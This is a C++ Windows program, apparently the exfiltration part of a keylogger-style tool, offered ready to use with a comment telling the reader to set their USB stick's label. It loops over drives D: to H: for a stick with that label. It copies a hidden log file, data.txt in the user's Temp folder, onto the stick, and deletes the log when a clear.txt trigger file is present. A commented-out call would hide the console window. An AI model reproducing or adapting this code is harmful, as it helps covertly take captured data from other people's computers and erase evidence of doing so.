// YOU HAVE TO SET NAME OF UR PENDRIVE IN checkDriveLabel()

#include<windows.h>
#include <iostream>
#include <Lmcons.h>
#include <fstream>
#include <string>
#include <fstream>
using namespace std;
string buff;
bool checkDriveLabel(string jd);
inline bool filexits(const std::string& name);

int main()
{
  //  ShowWindow(GetConsoleWindow(), SW_HIDE);
    string usun;
    string usun2;
    string komenda;
    char username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    GetUserName(username, &username_len);

    usun = "C:\\Users\\";
    usun += username;
    usun2 = "\\AppData\\Local\\Temp\\data.txt";
    usun += usun2;


    while (1) {

      
        
        if (checkDriveLabel("D:\\"))
        {
            if (filexits("D:\\data.txt"))
            {
                Sleep(100);
                continue;
            }
            else {
                komenda = "copy C:\\Users\\";
                komenda += username;
                string komenda2 = "\\AppData\\Local\\Temp\\data.txt  D:\\";
                komenda += komenda2;
                system(komenda.c_str());
            }
            if (filexits("D:\\clear.txt"))
            {
                cout << "clearing log file...\n";
                remove(usun.c_str());
            }
           
      
            
        }
        else {

            if (checkDriveLabel("E:\\"))
            {
                if (filexits("E:\\data.txt"))
                {
                    Sleep(100);
                    continue;
                }
                else {
                    komenda = "copy C:\\Users\\";
                    komenda += username;
                    string komenda2 = "\\AppData\\Local\\Temp\\data.txt  E:\\";
                    komenda += komenda2;
                    system(komenda.c_str());
                }
                if (filexits("E:\\clear.txt"))
                {
                    
                    cout << "clearing log file...\n";
                    remove(usun.c_str());
                }
               


            }
            else {
                if (checkDriveLabel("F:\\"))
                {
                    if (filexits("F:\\data.txt"))
                    {
                        Sleep(100);
                        continue;
                    }
                    else {
                        komenda = "copy C:\\Users\\";
                        komenda += username;
                        string komenda2 = "\\AppData\\Local\\Temp\\data.txt  F:\\";
                        komenda += komenda2;
                        system(komenda.c_str());
                    }
                    if (filexits("F:\\clear.txt"))
                    {
                        cout << "clearing log file...\n";
                        remove(usun.c_str());
                    }
                   


                }
                else {
                    if (checkDriveLabel("G:\\"))
                    {
                       
            

                        if (filexits("G:\\data.txt"))
                        {
                            Sleep(100);
                            continue;
                        }
                        else {
                            komenda = "copy C:\\Users\\";
                            komenda += username;
                            string komenda2 = "\\AppData\\Local\\Temp\\data.txt  G:\\";
                            komenda += komenda2;
                            system(komenda.c_str());
                        }
                        if (filexits("G:\\clear.txt"))
                        {
                          
                            remove(usun.c_str());
                            cout << "clearing log file...\n";
                        }
                       


                    }
                    else {
                        if (checkDriveLabel("H:\\"))
                        {
                            if (filexits("H:\\data.txt"))
                            {
                                Sleep(100);
                                continue;
                            }
                            else {
                                komenda = "copy C:\\Users\\";
                                komenda += username;
                                string komenda2 = "\\AppData\\Local\\Temp\\data.txt  H:\\";
                                komenda += komenda2;
                                system(komenda.c_str());
                            }
                          
                            if (filexits("H:\\clear.txt"))
                            {
                                remove(usun.c_str());
                                cout << "clearing log file...\n";
                            }
                         


                        }
                        else {


                        }

                    }

                }

            }

        }
  

        Sleep(25);
    }
   
}

bool checkDriveLabel(string jd) {
 

    DWORD dwDontNeedThis;
    char Label[MAX_PATH];
    char Label2[MAX_PATH] = "YOUR NAME OF PENDRIVE";
    GetVolumeInformation(jd.c_str(),
        Label,
        sizeof(Label),
        NULL,
        &dwDontNeedThis,
        &dwDontNeedThis,
        NULL,
        0);
 
    buff = Label;

    if (buff == "YOUR NAME OF PENDRIVE")
    {
        return true;
    }
    else return false;
  

}



inline bool filexits(const std::string& name) {
    struct stat buffer;
    return (stat(name.c_str(), &buffer) == 0);
}



